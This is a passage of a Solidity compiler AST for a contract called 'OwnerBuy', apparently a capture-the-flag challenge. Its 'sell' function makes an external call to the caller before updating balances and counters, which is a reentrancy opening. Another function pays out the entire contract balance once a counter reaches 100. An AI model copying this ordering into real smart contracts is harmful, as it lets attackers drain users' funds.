												"id": 443,
												"nodeType": "ExpressionStatement",
												"src": "4631:44:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 450,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"baseExpression": {
																	"argumentTypes": null,
																	"id": 445,
																	"name": "Times",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 165,
																	"src": "4694:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																		"typeString": "mapping(address => uint256)"
																	}
																},
																"id": 448,
																"indexExpression": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 446,
																		"name": "msg",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1241,
																		"src": "4700:3:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_magic_message",
																			"typeString": "msg"
																		}
																	},
																	"id": 447,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "sender",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": null,
																	"src": "4700:10:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address_payable",
																		"typeString": "address payable"
																	}
																},
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "IndexAccess",
																"src": "4694:17:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 449,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "4714:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "4694:21:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 444,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															1244,
															1245
														],
														"referencedDeclaration": 1244,
														"src": "4686:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
															"typeString": "function (bool) pure"
														}
													},
													"id": 451,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4686:30:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 452,
												"nodeType": "ExpressionStatement",
												"src": "4686:30:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 459,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"baseExpression": {
																	"argumentTypes": null,
																	"id": 454,
																	"name": "_balances",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 600,
																	"src": "4735:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																		"typeString": "mapping(address => uint256)"
																	}
																},
																"id": 457,
																"indexExpression": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 455,
																		"name": "msg",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1241,
																		"src": "4745:3:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_magic_message",
																			"typeString": "msg"
																		}
																	},
																	"id": 456,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "sender",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": null,
																	"src": "4745:10:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address_payable",
																		"typeString": "address payable"
																	}
																},
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "IndexAccess",
																"src": "4735:21:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">=",
															"rightExpression": {
																"argumentTypes": null,
																"id": 458,
																"name": "_amount",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 422,
																"src": "4760:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "4735:32:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 453,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															1244,
															1245
														],
														"referencedDeclaration": 1244,
														"src": "4727:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
															"typeString": "function (bool) pure"
														}
													},
													"id": 460,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4727:41:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 461,
												"nodeType": "ExpressionStatement",
												"src": "4727:41:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 468,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"id": 464,
																			"name": "this",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1267,
																			"src": "4795:4:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_contract$_OwnerBuy_$544",
																				"typeString": "contract OwnerBuy"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_contract$_OwnerBuy_$544",
																				"typeString": "contract OwnerBuy"
																			}
																		],
																		"id": 463,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "4787:7:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_address_$",
																			"typeString": "type(address)"
																		},
																		"typeName": "address"
																	},
																	"id": 465,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "4787:13:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"id": 466,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "balance",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "4787:21:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">=",
															"rightExpression": {
																"argumentTypes": null,
																"id": 467,
																"name": "_amount",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 422,
																"src": "4812:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "4787:32:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 462,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															1244,
															1245
														],
														"referencedDeclaration": 1244,
														"src": "4779:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
															"typeString": "function (bool) pure"
														}
													},
													"id": 469,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4779:41:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 470,
												"nodeType": "ExpressionStatement",
												"src": "4779:41:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"hexValue": "",
															"id": 480,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "4860:2:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																"typeString": "literal_string \"\""
															},
															"value": ""
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																"typeString": "literal_string \"\""
															}
														],
														"arguments": [
															{
																"argumentTypes": null,
																"hexValue": "31303030303030",
																"id": 478,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "4851:7:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_1000000_by_1",
																	"typeString": "int_const 1000000"
																},
																"value": "1000000"
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_rational_1000000_by_1",
																	"typeString": "int_const 1000000"
																}
															],
															"expression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 471,
																		"name": "msg",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1241,
																		"src": "4831:3:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_magic_message",
																			"typeString": "msg"
																		}
																	},
																	"id": 475,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "sender",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": null,
																	"src": "4831:10:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address_payable",
																		"typeString": "address payable"
																	}
																},
																"id": 476,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "call",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "4831:15:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$",
																	"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
																}
															},
															"id": 477,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "gas",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "4831:19:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_setgas_pure$_t_uint256_$returns$_t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$gas_$",
																"typeString": "function (uint256) pure returns (function (bytes memory) payable returns (bool,bytes memory))"
															}
														},
														"id": 479,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "4831:28:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$gas",
															"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
														}
													},
													"id": 481,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4831:32:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_bytes_memory_ptr_$",
														"typeString": "tuple(bool,bytes memory)"
													}
												},
												"id": 482,
												"nodeType": "ExpressionStatement",
												"src": "4831:32:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 484,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1241,
																"src": "4884:3:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 485,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "4884:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 487,
																	"name": "this",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1267,
																	"src": "4904:4:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_OwnerBuy_$544",
																		"typeString": "contract OwnerBuy"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_OwnerBuy_$544",
																		"typeString": "contract OwnerBuy"
																	}
																],
																"id": 486,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "4896:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 488,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "4896:13:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 489,
															"name": "_amount",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 422,
															"src": "4911:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 483,
														"name": "_transfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															286
														],
														"referencedDeclaration": 286,
														"src": "4874:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 490,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4874:45:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 491,
												"nodeType": "ExpressionStatement",
												"src": "4874:45:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 497,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 492,
															"name": "Times",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 165,
															"src": "4930:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 495,
														"indexExpression": {
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 493,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1241,
																"src": "4936:3:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 494,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "4936:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "4930:17:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "-=",
													"rightHandSide": {
														"argumentTypes": null,
														"hexValue": "31",
														"id": 496,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "4951:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_1_by_1",
															"typeString": "int_const 1"
														},
														"value": "1"
													},
													"src": "4930:22:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 498,
												"nodeType": "ExpressionStatement",
												"src": "4930:22:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "74727565",
													"id": 499,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "bool",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "4970:4:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"value": "true"
												},
												"functionReturnParameters": 426,
												"id": 500,
												"nodeType": "Return",
												"src": "4963:11:0"
											}
										]
									},
									"documentation": null,
									"id": 502,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "sell",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 423,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 422,
												"name": "_amount",
												"nodeType": "VariableDeclaration",
												"scope": 502,
												"src": "4539:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 421,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4539:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4538:17:0"
									},
									"returnParameters": {
										"id": 426,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 425,
												"name": "success",
												"nodeType": "VariableDeclaration",
												"scope": 502,
												"src": "4572:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 424,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "4572:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4571:14:0"
									},
									"scope": 544,
									"src": "4525:457:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 542,
										"nodeType": "Block",
										"src": "5040:189:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 515,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"baseExpression": {
																	"argumentTypes": null,
																	"id": 510,
																	"name": "Times",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 165,
																	"src": "5059:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																		"typeString": "mapping(address => uint256)"
																	}
																},
																"id": 513,
																"indexExpression": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 511,
																		"name": "msg",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1241,
																		"src": "5065:3:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_magic_message",
																			"typeString": "msg"
																		}
																	},
																	"id": 512,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "sender",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": null,
																	"src": "5065:10:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address_payable",
																		"typeString": "address payable"
																	}
																},
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "IndexAccess",
																"src": "5059:17:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">=",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "313030",
																"id": 514,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "5080:3:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_100_by_1",
																	"typeString": "int_const 100"
																},
																"value": "100"
															},
															"src": "5059:24:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 509,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															1244,
															1245
														],
														"referencedDeclaration": 1244,
														"src": "5051:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
															"typeString": "function (bool) pure"
														}
													},
													"id": 516,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5051:33:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 517,
												"nodeType": "ExpressionStatement",
												"src": "5051:33:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 523,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 518,
															"name": "Times",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 165,
															"src": "5095:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 521,
														"indexExpression": {
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 519,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1241,
																"src": "5101:3:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 520,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "5101:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "5095:17:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 522,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "5115:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "5095:21:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 524,
												"nodeType": "ExpressionStatement",
												"src": "5095:21:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 531,
																		"name": "this",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1267,
																		"src": "5155:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_contract$_OwnerBuy_$544",
																			"typeString": "contract OwnerBuy"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_contract$_OwnerBuy_$544",
																			"typeString": "contract OwnerBuy"
																		}
																	],
																	"id": 530,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "5147:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": "address"
																},
																"id": 532,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "5147:13:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"id": 533,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "balance",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "5147:21:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 525,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1241,
																"src": "5127:3:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 528,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "5127:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"id": 529,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "transfer",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "5127:19:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_transfer_nonpayable$_t_uint256_$returns$__$",
															"typeString": "function (uint256)"
														}
													},
													"id": 534,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5127:42:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 535,
												"nodeType": "ExpressionStatement",
												"src": "5127:42:0"
											},
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"hexValue": "74727565",
															"id": 537,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "bool",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "5194:4:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"value": "true"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 536,
														"name": "finished",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 176,
														"src": "5185:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_bool_$returns$__$",
															"typeString": "function (bool)"
														}
													},
													"id": 538,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5185:14:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 539,
												"nodeType": "EmitStatement",
												"src": "5180:19:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "74727565",
													"id": 540,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "bool",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "5217:4:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"value": "true"
												},
												"functionReturnParameters": 508,
												"id": 541,
												"nodeType": "Return",
												"src": "5210:11:0"
											}
										]
									},
									"documentation": null,
									"id": 543,
									"implemented": true,
									"kind": "function",
									"modifiers": [
										{
											"arguments": null,
											"id": 505,
											"modifierName": {
												"argumentTypes": null,
												"id": 504,
